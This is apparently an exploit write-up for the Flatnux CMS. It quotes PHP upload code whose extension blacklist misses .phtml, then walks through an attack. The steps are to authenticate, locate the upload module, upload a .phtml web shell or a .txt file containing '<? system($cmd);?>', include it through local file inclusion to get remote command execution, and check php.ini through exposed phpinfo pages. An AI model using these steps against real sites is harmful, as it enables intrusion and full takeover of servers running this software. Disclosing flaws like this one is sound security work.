Flatnux suffers of multiple local file inclusions: (output of my scanner)

Now see...
File: /include/xmldb.php - Lines: 433-447

if (isset ($_FILES[$key][&#039;tmp_name&#039;]) && $_FILES[$key][&#039;tmp_name&#039;] != "")
{
				
	if (eregi(&#039;.php&#039;, $_FILES["$key"][&#039;name&#039;]) || eregi(&#039;.php3&#039;, $_FILES["$key"][&#039;name&#039;]) || eregi(&#039;.php4&#039;, $_FILES["$key"][&#039;name&#039;]) || eregi(&#039;.php5&#039;, $_FILES["$key"][&#039;name&#039;])) <==
	{
		touch("$path/$databasename/$tablename/$unirecid/$key/" . $_FILES["$key"][&#039;name&#039;]);
	}
	else
	{
		if (!file_exists("$path/$databasename/$tablename/$unirecid"))
			mkdir("$path/$databasename/$tablename/$unirecid");
		if (!file_exists("$path/$databasename/$tablename/$unirecid/$key"))
			mkdir("$path/$databasename/$tablename/$unirecid/$key");
		move_uploaded_file(realpath($_FILES[$key][&#039;tmp_name&#039;]), "$path/$databasename/$tablename/$unirecid/$key/" . $_FILES["$key"][&#039;name&#039;]); <==


As you can see the script checks for .php .php3/4/5 extensions but what about
.phtml extension?

To upload a file you need a valid login.

You can get the upload module at the URLs:

- /path/index.php?mod=08_Files
where 08 is the default number but it can be different (max 20 i think)

or 
- /path/index.php?mod=none_Files


Remember that you need auto be authenticated.

Now upload your shell with .phtml extension and retrieve its link.

upload a .txt file with malicious code (ex <? system($cmd);?>)

And include it with one of local file inclusions reported before.
So you can obtain a Remote Command Execution depending of php.ini configuration becouse lfi&#039;s works with:

register_globals = On
magic_quotes_gpc = Off

Too see the php.ini configuration you can use this phpinfo() disclosure:

- /path/sections/none_Control_Center/phpinfo.php
or
- /path/sections/10_Control_Center/phpinfo.php
where 10 can be different number (max 20 i think)
